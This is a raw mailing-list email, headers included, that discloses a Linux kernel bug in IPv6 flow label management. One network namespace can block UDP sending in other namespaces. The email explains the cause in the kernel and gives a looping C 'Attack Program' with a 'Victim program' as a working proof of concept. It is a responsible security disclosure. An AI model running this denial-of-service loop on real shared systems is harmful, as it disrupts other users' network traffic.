Return-Path: <netdev-owner@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id 2BDC64B3ACE
	for <lists+netdev@lfdr.de>; Sun, 13 Feb 2022 11:31:57 +0100 (CET)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S234946AbiBMKbp (ORCPT <rfc822;lists+netdev@lfdr.de>);
        Sun, 13 Feb 2022 05:31:45 -0500
Received: from mxb-00190b01.gslb.pphosted.com ([23.128.96.19]:48682 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S229935AbiBMKbo (ORCPT
        <rfc822;netdev@vger.kernel.org>); Sun, 13 Feb 2022 05:31:44 -0500
Received: from NAM04-BN8-obe.outbound.protection.outlook.com (mail-bn8nam08on2114.outbound.protection.outlook.com [40.107.100.114])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 564C25D197
        for <netdev@vger.kernel.org>; Sun, 13 Feb 2022 02:31:38 -0800 (PST)
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=gBldlphgbCKbRPHWHb89Cy5JydAFlPWylbdi2f0mV+wPDGowIOkLWT01D+NTAZvEQALybSZiUfP5SbRQ4b92DcNEpx9AgwOBijpMhEl9F1bSVaGHbtXx71WHD6Kmf7rv7CeVKOOXYL+0uxS+1mh4AQ2c7lycB6j+oqg8nynR6RU+iHXImFTG587Au8Fb4jzSE088Nk8LRd92Ea7trfcFl8pE+hY1eJI58eBP6J6kgpyn5KOLgZMegsEfKUEFh+57wOt4RfUP0x8jHuvc2bzum4NAbA+1rJo6zduLrMheu+fuzAx3RWoHyuZ1/mOLRIq0YvZOaMD9IHYCq8UNyPdzWA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=DaQhgaXJ4xbii61ygu2tzI2e0E7FPMjzAH8dDXSfgM0=;
 b=YQQK+sn2b6d6zx2a32wAVuz3oZans/4lVCqUTYLqXknYfWmym0FFLmby6iy5piRL3se+9SVoPLH1N5mVL74OLjjix0ueqSyW4jAWwcgQs5DSGiKrTE00znURkr7lWnepvUblGG9Y+5U7H2JtUkBwPMga94sZesK7GoVqmkYukxSvreVVvEyWx+uiyrNOc540VRGJsaNNwowiaJgGPDgx/KjK47hyrElRe0bZl2OBQc2xcxHyMQxNRId8y4iKpQDyLln0QfiIWUx5jJ+jEzlnCr6qlGxodx6XxvIY7ZcLbonM3IgQN5S/pUdoAjp1sjYIpjbDXbFwDv0r2RSGI/QhbQ==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
 dkim=none; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=purdue0.onmicrosoft.com; s=selector2-purdue0-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=DaQhgaXJ4xbii61ygu2tzI2e0E7FPMjzAH8dDXSfgM0=;
 b=DYbV4DwmU5NjNAlLNIjzOkcZpOjFF07vRQGKXajPvydwWBCpl5vTPPYVzJSmhktCu/7drM9lJWWTC1LYyBzj9Lkn3dzo8VP19mSLOnQJaMbG6caQFQcCAeALV+qt9d02TGgvQZgs/UhWKns+6BIkeZaOBF42jtRdR8B1Wt8lmA4=
Received: from MWHPR2201MB1072.namprd22.prod.outlook.com
 (2603:10b6:301:33::18) by PH0PR22MB2873.namprd22.prod.outlook.com
 (2603:10b6:510:f8::8) with Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.4975.11; Sun, 13 Feb
 2022 10:31:35 +0000
Received: from MWHPR2201MB1072.namprd22.prod.outlook.com
 ([fe80::54ec:7a2b:ad0c:c89]) by MWHPR2201MB1072.namprd22.prod.outlook.com
 ([fe80::54ec:7a2b:ad0c:c89%7]) with mapi id 15.20.4975.015; Sun, 13 Feb 2022
 10:31:34 +0000
From:   "Liu, Congyu" <liu3101@purdue.edu>
To:     "willemb@google.com" <willemb@google.com>,
        "security@kernel.org" <security@kernel.org>,
        "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>,
        "netdev@vger.kernel.org" <netdev@vger.kernel.org>
Subject: BUG: potential net namespace bug in IPv6 flow label management 
Thread-Topic: BUG: potential net namespace bug in IPv6 flow label management 
Thread-Index: AQHYIMSI8GnBA/CCckW7koPG3MiKnA==
Date:   Sun, 13 Feb 2022 10:31:34 +0000
Message-ID: <MWHPR2201MB1072BCCCFCE779E4094837ACD0329@MWHPR2201MB1072.namprd22.prod.outlook.com>
Accept-Language: en-US, zh-CN
Content-Language: en-US
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
suggested_attachment_session_id: edf62604-8a8f-ce5f-7dc0-45abab434485
authentication-results: dkim=none (message not signed)
 header.d=none;dmarc=none action=none header.from=purdue.edu;
x-ms-publictraffictype: Email
x-ms-office365-filtering-correlation-id: 89e39460-9c23-47bc-557c-08d9eedc0210
x-ms-traffictypediagnostic: PH0PR22MB2873:EE_
x-microsoft-antispam-prvs: <PH0PR22MB2873B76E50024B5BA442D0A8D0329@PH0PR22MB2873.namprd22.prod.outlook.com>
x-ms-oob-tlc-oobclassifiers: OLM:9508;
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam: BCL:0;
x-microsoft-antispam-message-info: 2pzUeBAvsx4fJ01mS8ifuXj+qI+/ypRg+Nj83NR/jPTwWjn6w6l0RLEWs1B4qoa2yraFdL3jRgTed7s/r/domsPoN/Hb8cj7CfJXt0bBCK5Vn4OsBYHzTc+5qYAaLBrY+qGSfqmJ02YM9TPSSHV29wLzEp5LgNhV38uuiK7ciHeAiAgP5OLowLZ8gAwKhs9nymACJxDQTN7vK/5GdGEPe4zTUwjSqTJbiYjINC8AzrXR31vWEDVHmBNiX02dWoNVmlBv0/OGyMjfHOlMLmyCL7zX78y6rxwmHusXgl6SWCyIVDcRn11hGrj3azN5i65HgFbI3qYYC79h7yWEP2Oe6ZUC/H2lusdfj8Yp/VyBRu/csPsKLhfyIwNs7bNNzFb+wfX93QjtZn6rpWqUQkyZnPnV1bAf534RBkNmKiVfMsoonVOiZlqn0LFc0yTIKBDW3buZSwL8cdxpriddP7L/HnUQ6gKlm/42mjwbKa3kHb05kMvpioBmdp/66GvnnDBd4LTNSAxmhW7g18YtQWUSyng4n4v+wdv3jRpdI0dF0229SM7E47/mqJ6nm3Y6lqcHt5Rlf3ie3HbuXDzt5LRJ399LyEURdiQQIKKeqxEEEM96GslUsyfyL0ARb92Fe9N9rFK81HP1XK3pLOZ/uuyBIdGpImn3FuzwGY2xiM8AfTPmPcHBDKnEcC2p6nfg1dTzV9+mf+BZVYZdR0NEK+IfyQ==
x-forefront-antispam-report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:MWHPR2201MB1072.namprd22.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230001)(4636009)(366004)(66946007)(2906002)(76116006)(4743002)(9686003)(786003)(52536014)(110136005)(75432002)(55016003)(83380400001)(5660300002)(186003)(66556008)(7696005)(38070700005)(6506007)(71200400001)(86362001)(64756008)(66476007)(66446008)(8676002)(33656002)(91956017)(8936002)(38100700002)(316002)(122000001)(508600001);DIR:OUT;SFP:1102;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0: =?iso-8859-1?Q?Y+OSBG1OAnnAuiG9NdqYjfmCbgvg+NmJksZjnsik8N7bKukLqzQJDFfQOz?=
 =?iso-8859-1?Q?/hDoWheH1r1j4DyUM+5q8Pl+VSDR48CVuZDYSC0vfcXkGuO9VFfmnkop2u?=
 =?iso-8859-1?Q?c2hcJh+143G2qKLa28ddh33MoJ4r37kEXZiMRO0Pc0pVQiX0ATERdjxo0a?=
 =?iso-8859-1?Q?r+ptiTH5vqmTH/mYQyUwKh/zY+IQwrTc06/gFpMFpHNcbOMLND7i7cK2c4?=
 =?iso-8859-1?Q?IYVZURj8um/LgXKQ/hOS7zTvGiASLndH1PJCiWlDD54LnWvD/uf9gZ1Ntx?=
 =?iso-8859-1?Q?Qpk/KMojTzxGsADcNFcGuSmgHYsHgzTWAbZpEXVu5zyllb7ilzgXR4QG2I?=
 =?iso-8859-1?Q?9tFfQEYUgZV0EeA3fOtNlJnFpRzmxmLpaEUn1WXds3G/TS6hWnfn8pHc/R?=
 =?iso-8859-1?Q?W0845xSQfXc/oml8Wk3t8t1P+K5Gxt1P25yAZ87Sb5T0eMBQEHuva65c7v?=
 =?iso-8859-1?Q?g3++S5iJbOgcRtBiDd/JNugbT9N58uqVYPgwp9/UK8LrsBt/xTqcn/GYbX?=
 =?iso-8859-1?Q?y2lLbeZxkMvN85j56kBdq86l8kg6lJ/GuKFsylRF2FZhFWVECfYn04Q4Ph?=
 =?iso-8859-1?Q?eVJt2lGBB2GvQCYEvt2Sd5Bs7t1xb6dNIzT+xd2RdSI2PCdxT7MV2N+puj?=
 =?iso-8859-1?Q?vikQiEdzLQUnlaJXSDxJyyf81owtaOvfo8739RGcCjWP0MEWQRKgvpiV+2?=
 =?iso-8859-1?Q?qUMWdK3ussfVgsmbHnT9DiqSmYkcNTfVu6P+z7tgnG/ffwJIlp3ORIebGx?=
 =?iso-8859-1?Q?D73t6kHrdFvVprWSH73nrToYhFSeU3EvqWtO5LaM8naC4wbchu8xGSIiOs?=
 =?iso-8859-1?Q?myedsZ9XSqpfm2BWzo/igKNO3KwWMzbe304REJnw5DOpzGKH7i892iQYRP?=
 =?iso-8859-1?Q?009nqfNYn091Hy/T0Ty+GIZrNEwTCm+KwPe1jDDx6jtIOut/gFaUKA9AJw?=
 =?iso-8859-1?Q?Z10OdfBGlS2kLKxOM7pj+RxC5yXQN8jsfWNSySrqUW/dUDi7Nu3XImdi6y?=
 =?iso-8859-1?Q?lkgNtM8nKzdx2FpuRnW4MWEODWM+5TGBa7AM5vXeyu/hO+oJZ0Dwz0wGNk?=
 =?iso-8859-1?Q?5JBD4yT/NEykt6h7CbnRYB2T4oqYe0lsJYomQYGxcNEqTfqbMAWfQ6f8mK?=
 =?iso-8859-1?Q?2VEVY0EAZMKFtB0uJtrZ4Sp6B9+Da1UQOJSz0CPml8GAqiTuvXCh8MN0zh?=
 =?iso-8859-1?Q?Z9t5D8cTaPc/6icUtzA76J/ZTjn8wtrIhm6eEQdpke40dxCiPdGAKtoGOR?=
 =?iso-8859-1?Q?kxTPjKaDhxQz9lEUoEEQZk6741kC8awzBiRal1zmzv4rYozyhkHefzgsCA?=
 =?iso-8859-1?Q?KNViDa1+0uUnygWG0vfotsy40g1pAIMaSDFlJDkd+rvVkAju1vOCvqx0bp?=
 =?iso-8859-1?Q?4GQrxb85PG1khrbwR3HMzdHAN87y2JKZSdcwYI76FjBUWs0aLlGBnKokvH?=
 =?iso-8859-1?Q?dtKhT/8CYIq68zbe4oiR1N4oqxSi27ECAdkWa5fKIzvejex35x3So2ryym?=
 =?iso-8859-1?Q?sJpKeJYB/4+J4IRT40Kx+ArCICypaHNfDn9diTXF/gUYGwvOLIxvZhZDJ+?=
 =?iso-8859-1?Q?E2/xwnglOORVfc9ztQbNYrpcnSQpyC1PHVCkW1cF1s6kN4RUA/llxbLFE7?=
 =?iso-8859-1?Q?61lmFcnqTMpuyVx6isYXEAtPIfrkDeMbodJeWRKZz1M2+LlCtDeL5Nfmc/?=
 =?iso-8859-1?Q?2CFnSVrdmlTFVjSNcYdsdD6/+id6yVlWwznBJ8sx1sLWyIveC/4A86Nhp6?=
 =?iso-8859-1?Q?VM4Q=3D=3D?=
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0
X-OriginatorOrg: purdue.edu
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: MWHPR2201MB1072.namprd22.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 89e39460-9c23-47bc-557c-08d9eedc0210
X-MS-Exchange-CrossTenant-originalarrivaltime: 13 Feb 2022 10:31:34.3539
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 4130bd39-7c53-419c-b1e5-8758d6d63f21
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: GPXl7uM0zLVZar1zxA7OXmIwEoxhl03UAevy2nRFphetgP3MrG82j1mo4xbZ/YaS+sz/WU59z7bnCvAhgX6A6A==
X-MS-Exchange-Transport-CrossTenantHeadersStamped: PH0PR22MB2873
X-Spam-Status: No, score=-1.9 required=5.0 tests=BAYES_00,DKIM_SIGNED,
        DKIM_VALID,RCVD_IN_DNSWL_NONE,RCVD_IN_MSPIKE_H2,SPF_HELO_PASS,SPF_PASS,
        T_SCC_BODY_TEXT_LINE autolearn=ham autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <netdev.vger.kernel.org>
X-Mailing-List: netdev@vger.kernel.org

=0A=
Hi,=0A=
=0A=
In the test conducted on namespace, I found that one unsuccessful IPv6 flow=
 label =0A=
management from one net ns could stop other net ns's data transmission that=
 requests =0A=
flow label for a short time. Specifically, in our test case, one unsuccessf=
ul =0A=
`setsockopt` to get flow label will affect other net ns's `sendmsg` with fl=
ow label =0A=
set in cmsg. Simple PoC is included for verification. The behavior descirbe=
d above =0A=
can be reproduced in latest kernel.=0A=
=0A=
I managed to figure out the data flow behind this: when asking to get a flo=
w label, =0A=
some `setsockopt` parameters can trigger function `ipv6_flowlabel_get` to c=
all `fl_create` =0A=
to allocate an exclusive flow label, then call `fl_release` to release it b=
efore returning =0A=
-ENOENT. Global variable `ipv6_flowlabel_exclusive`, a rate limit jump labe=
l that keeps =0A=
track of number of alive exclusive flow labels, will get increased instantl=
y after calling =0A=
`fl_create`. Due to its rate limit design, `ipv6_flowlabel_exclusive` can o=
nly decrease =0A=
sometime later after calling `fl_decrease`. During this period, if data tra=
nsmission function =0A=
in other net ns (e.g. `udpv6_sendmsg`) calls `fl_lookup`, the false `ipv6_f=
lowlabel_exclusive` =0A=
will invoke the `__fl_lookup`. In the test case observed, this function ret=
urns error and =0A=
eventually stops the data transmission.=0A=
=0A=
I further noticed that this bug could somehow be vulnerable: if `setsockopt=
` is called =0A=
continuously, then `sendmmsg` call from other net ns will be blocked foreve=
r. Using the PoC =0A=
provided, if attack and victim programs are running simutaneously, victim p=
rogram cannot transmit =0A=
data; when running without attack program, the victim program can transmit =
data normally.=0A=
=0A=
Thanks,=0A=
Congyu=0A=
=0A=
=0A=
=0A=
=0A=
Attack Program:=0A=
=0A=
#define _GNU_SOURCE=0A=
#include <linux/in6.h>=0A=
#include <stdio.h>=0A=
#include <stdlib.h>=0A=
#include <fcntl.h>=0A=
#include <string.h>=0A=
#include <sys/socket.h>=0A=
#include <netinet/in.h>=0A=
#include <unistd.h>=0A=
#include <error.h>=0A=
#include <errno.h>=0A=
#include <sched.h>=0A=
#include <stdbool.h>=0A=
=0A=
=0A=
int main() {=0A=
	int fd1, ret, pid;=0A=
	unshare(CLONE_NEWNET);=0A=
	if ((fd1 =3D socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDPLITE)) < 0)=0A=
		error(1, errno, "socket");=0A=
	struct in6_flowlabel_req req =3D {=0A=
		.flr_action =3D IPV6_FL_A_GET,=0A=
		.flr_label =3D 0,=0A=
		.flr_flags =3D 0,=0A=
		.flr_share =3D IPV6_FL_S_USER,=0A=
	};=0A=
	req.flr_dst.s6_addr[0] =3D 0xfd;=0A=
 	req.flr_dst.s6_addr[15] =3D 0x1;=0A=
=0A=
	while(1) {=0A=
		ret =3D setsockopt(fd1, SOL_IPV6, IPV6_FLOWLABEL_MGR, &req, sizeof(req));=
=0A=
	}=0A=
=0A=
	return 0;=0A=
}=0A=
=0A=
=0A=
=0A=
Victim program:=0A=
=0A=
#define _GNU_SOURCE=0A=
#include <linux/in6.h>=0A=
#include <stdio.h>=0A=
#include <stdlib.h>=0A=
#include <fcntl.h>=0A=
#include <string.h>=0A=
#include <sys/socket.h>=0A=
#include <netinet/in.h>=0A=
#include <unistd.h>=0A=
#include <error.h>=0A=
#include <errno.h>=0A=
#include <sched.h>=0A=
#include <stdbool.h>=0A=
=0A=
static const char cfg_data[] =3D "a";=0A=
=0A=
static void do_send(int fd, struct sockaddr_in6 addr, bool with_flowlabel, =
uint32_t flowlabel)=0A=
 {=0A=
 	char control[CMSG_SPACE(sizeof(flowlabel))] =3D {0};=0A=
 	struct msghdr msg =3D {0};=0A=
 	struct iovec iov =3D {0};=0A=
 	int ret;=0A=
=0A=
 	iov.iov_base =3D (char *)cfg_data;=0A=
 	iov.iov_len =3D sizeof(cfg_data);=0A=
=0A=
 	msg.msg_iov =3D &iov;=0A=
 	msg.msg_iovlen =3D 1;=0A=
	msg.msg_name =3D &addr;=0A=
	msg.msg_namelen =3D sizeof(addr);=0A=
=0A=
 	if (with_flowlabel) {=0A=
 		struct cmsghdr *cm;=0A=
=0A=
 		cm =3D (void *)control;=0A=
 		cm->cmsg_len =3D CMSG_LEN(sizeof(flowlabel));=0A=
 		cm->cmsg_level =3D SOL_IPV6;=0A=
 		cm->cmsg_type =3D IPV6_FLOWINFO;=0A=
 		*(uint32_t *)CMSG_DATA(cm) =3D htonl(flowlabel);=0A=
=0A=
 		msg.msg_control =3D control;=0A=
 		msg.msg_controllen =3D sizeof(control);=0A=
 	}=0A=
=0A=
 	ret =3D sendmsg(fd, &msg, 0);=0A=
=0A=
	fprintf(stderr, "sendmsg ret =3D %d\n", ret);=0A=
}=0A=
=0A=
static void do_recv(int fd, bool with_flowlabel, uint32_t expect)=0A=
 {=0A=
 	char control[CMSG_SPACE(sizeof(expect))];=0A=
 	char data[sizeof(cfg_data)];=0A=
 	struct msghdr msg =3D {0};=0A=
 	struct iovec iov =3D {0};=0A=
 	struct cmsghdr *cm;=0A=
 	uint32_t flowlabel;=0A=
 	int ret;=0A=
=0A=
 	iov.iov_base =3D data;=0A=
 	iov.iov_len =3D sizeof(data);=0A=
=0A=
 	msg.msg_iov =3D &iov;=0A=
 	msg.msg_iovlen =3D 1;=0A=
=0A=
=0A=
 	memset(control, 0, sizeof(control));=0A=
 	msg.msg_control =3D control;=0A=
 	msg.msg_controllen =3D sizeof(control);=0A=
=0A=
 	recvmsg(fd, &msg, 0);=0A=
}=0A=
=0A=
int main() {=0A=
	int fd1, ret, pid;=0A=
	unshare(CLONE_NEWNET);=0A=
	pid =3D fork();=0A=
	if (pid =3D=3D 0) {=0A=
		execlp("ip", "ip", "link", "set", "dev", "lo", "up", NULL);=0A=
	}=0A=
	sleep(1);=0A=
	struct sockaddr_in6 src_addr =3D {=0A=
 		.sin6_family =3D AF_INET6,=0A=
 		.sin6_port =3D htons(7000),=0A=
 		.sin6_addr =3D in6addr_loopback,=0A=
		.sin6_flowinfo =3D htonl(0),=0A=
		.sin6_scope_id =3D 0,=0A=
 	};=0A=
	struct sockaddr_in6 dst_addr =3D {=0A=
 		.sin6_family =3D AF_INET6,=0A=
 		.sin6_port =3D htons(8000),=0A=
 		.sin6_addr =3D in6addr_loopback,=0A=
		.sin6_flowinfo =3D htonl(0),=0A=
		.sin6_scope_id =3D 0,=0A=
 	};=0A=
	pid =3D fork();=0A=
	int fd2;=0A=
	if (pid =3D=3D 0) {=0A=
		if((fd2 =3D socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)) < 0)=0A=
			error(1, errno, "socket");=0A=
		if(bind(fd2, (void *)&dst_addr, sizeof(dst_addr)) < 0)=0A=
			error(1, errno, "bind");=0A=
		while(1) {=0A=
			do_recv(fd2, true, 123456);=0A=
		}=0A=
		return 0;=0A=
		=0A=
	}=0A=
	sleep(1);=0A=
	if((fd2 =3D socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)) < 0)=0A=
 		error(1, errno, "socket");=0A=
	while(1) {=0A=
		do_send(fd2, dst_addr, true, 123456);=0A=
		usleep(100000);=0A=
	}=0A=
=0A=
	return 0;=0A=
}=
